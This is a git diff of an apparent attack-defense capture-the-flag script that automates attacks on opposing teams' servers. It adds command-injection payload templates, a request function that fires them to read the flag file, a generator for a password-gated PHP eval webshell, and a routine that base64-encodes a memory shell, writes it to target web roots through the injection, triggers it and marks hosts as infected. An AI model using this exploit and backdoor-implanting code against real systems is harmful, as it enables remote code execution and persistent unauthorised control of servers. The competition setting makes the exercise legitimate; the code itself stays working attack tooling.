@@ -6,33 +6,45 @@
 @Author     : Gr%1m
 @Date       : 14/11/2023 10:56 am
 """
-import requests, pymysql, paramiko
+from Configs.frame_config import FRAME_DIR
+from urllib.parse import urlparse as URL
+import requests, pymysql, paramiko, base64
 import hashlib
+import os
 import re
 
 # About Flag
 Flags = set()
 FlagPath = '/flag'
 FlagLen = 41
-FlagRegular = r'flag{(\w|-){35}}'
+FlagRegular = r'flag{(\w|-){32}}'
 
 # Payload INFO
-RceRelpaceStr = 'XXXRCEstr'
-Payloads = [f"GET:::80/js/config.php?s=system('{RceRelpaceStr}');",
-            f'POST::/dvwa/vulnerabilities/exec/#?ip=127.0.0.1;{RceRelpaceStr}&submit=submit']
+RceReplaceStr = 'XXXRCEstr'
+HostReplaceStr = 'XXXHostname'
+Payloads = {
+    f"http://POST@{HostReplaceStr}:80/awdtest/testback.php?submit=submit&bb={RceReplaceStr}",
+}
+WebRootDir = '/var/www/html'
 LoginCookie = 'security=low; PHPSESSID=e16f5c982733368120234560b9cb5625'
 
 # Backdoor INFO
-BDNameR = "HM_NAME_REPLACE"
-BDDataR = "WAIT_FOR_REPLACE"
-BDpass = 'x2aom1ng_20231114'
+ErgodicDirReplace = "WEB_ROOT_REPLACE"
+BDNameReplace = "HM_NAME_REPLACE"
+BDDataReplace = "WAIT_FOR_REPLACE"
+
+BDFileName = 'a10uN7yA_1'
+BDcmdPass = 'x2aom1ng_20231114'
+BDRceParam = 'kAt3l1na'
+MemShell = f"http://POST@{HostReplaceStr}:80/{BDFileName}?cmd={BDcmdPass}&{BDRceParam}={RceReplaceStr}"
+# todo: attack
 
 # Enemy INFO
 X = 'x'
 
 
 def up_payloads(data):
-    Payloads.append(data)
+    Payloads.add(data)
 
 
 def submit_flag(submitAPI, token, flag):
@@ -53,51 +65,89 @@ def submit_flag(submitAPI, token, flag):
         return 0, 0
 
 
-def get_flag(ey_hosts, rce='cat /flag'):
-    for ey in ey_hosts:
-        for payload in Payloads:
-            method, payload = payload.split('::', maxsplit=1)
-            payload = payload.replace(RceRelpaceStr, rce)
-            if method == 'GET':
-                url = f'http://{ey}{payload}'
-                res = requests.get(url=url, headers={'Cookie': LoginCookie})
-            else:
-                ppath, params = payload.split('?', maxsplit=1)
-                url = f'http://{ey}{ppath}'
-                data = {_.split('=', maxsplit=1)[0]: _.split('=', maxsplit=1)[1] for _ in params.split('&')}
-                res = requests.post(url, data=data, headers={'Cookie': LoginCookie})
+def attack_vul(hostname, payload, cmd):
+    purl = URL(payload)
+    method, payload = purl.hostname, payload.split(f'@{HostReplaceStr}')[-1]
+    payload = payload.replace(RceReplaceStr, cmd)
+    url = f'http://{hostname}{payload}'
+    try:
+        if method == 'GET':
+            res = requests.get(url=url, headers={'Cookie': LoginCookie})
+        else:
+            params = payload.split('?', maxsplit=1)[-1]
+            data = {_.split('=', maxsplit=1)[0]: _.split('=', maxsplit=1)[1] for _ in params.split('&')}
+            res = requests.post(url, data=data, headers={'Cookie': LoginCookie})
+    except:
+        res = None
 
-            if 'flag{' in res.text:
-                flag = re.search(FlagRegular, res.text).group()
-                flag = flag.strip()
+    return res, purl
+
+
+def get_flag(ey_hosts, rce="system('cat /flag');"):
+    def extract_flag(text):
+        try:
+            flag = re.search(FlagRegular, text).group()
+        except AttributeError:
+            return None
+        else:
+            return flag.strip()
+
+    for ey in ey_hosts:
+        if ey_hosts[ey] == 'Infected':
+            # todo : attack by mem shell
+            res, _ = attack_vul(ey, MemShell, rce)
+            Flags.add(extract_flag(res.text))
+
+        for payload in Payloads:
+            res, _ = attack_vul(ey, payload, rce)
+            flag = extract_flag(res.text)
+            if flag:
                 Flags.add(flag)
-                break
-            else:
-                pass
+
+    Flags.remove(None)
 
 
 def generate_muma():
-    bdp_md5 = hashlib.md5(BDpass.encode()).hexdigest()
-    xiaoma_file = f"<?php if(md5($_GET['cmd'])=='{bdp_md5}'" + "){@eval($_POST['kAt3l1na']);}?>"
-    # todo:
-    #   Payloads.append(f"?shell.php?cmd={BDpass}&kAt3l1na=system('{RceRelpaceStr}');")
+    bdp_md5 = hashlib.md5(BDcmdPass.encode()).hexdigest()
+    LeftBraces = '{'
+    RightBraces = '}'
+    xiaoma_file = f"<?php if(md5($_GET['cmd'])=='{bdp_md5}'){LeftBraces}@eval($_POST['{BDRceParam}']);{RightBraces}?>"
+    return base64.b64encode(xiaoma_file.encode())
 
 
 # Implant Trojan
-def backdoor_in():
-    pass
+def backdoor_in(ey_hosts):
+    with open(f'{FRAME_DIR}/data/memshell.php', 'rb') as f:
+        memshell = f.read()
+
+    memshell = memshell.replace(BDNameReplace.encode(), BDFileName.encode())
+    memshell = memshell.replace(BDDataReplace.encode(), generate_muma())
+    ergodic = base64.b64encode(memshell)
+    door_puts = f"file_put_contents('ergodic.php',base64_decode({ergodic}));"
+    for ey in ey_hosts:
+        for payload in Payloads:
+            res, purl = attack_vul(ey, payload, door_puts)
+            try:
+                trigger = requests.get(f'http://{ey}{os.path.dirname(purl.path)}/ergodic.php', timeout=(1, 0.01))
+            except requests.exceptions.Timeout:
+                trigger = 'timeout'
+
+            if trigger == 'timeout' or trigger.status_code == 200:
+                print(f'{ey} Successfully Infected')
+                ey_hosts[ey] = 'Infected'
 
 
-def connect_ssh(myhostssh):
+def connect_ssh(eyhostsshurl):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    eyhostssh = URL(eyhostsshurl)
 
     try:
-        client.connect(hostname=myhostssh.split('@')[1].split(':')[0],
-                       port=int(myhostssh.split(':')[-1].split('/')[0]),
-                       username=myhostssh.split(':')[1][2:],
-                       password=myhostssh.split(':')[2].split('@')[0])
-        print(f"[+] connect Host {myhostssh.split('@')[1].split(':')[0]}")
+        client.connect(hostname=eyhostssh.hostname,
+                       username=eyhostssh.username,
+                       password=eyhostssh.password,
+                       port=eyhostssh.port, )
+        print(f"[+] connect Host {eyhostssh.hostname}")
 
         _, stdout, stderr = client.exec_command('pwd')
 
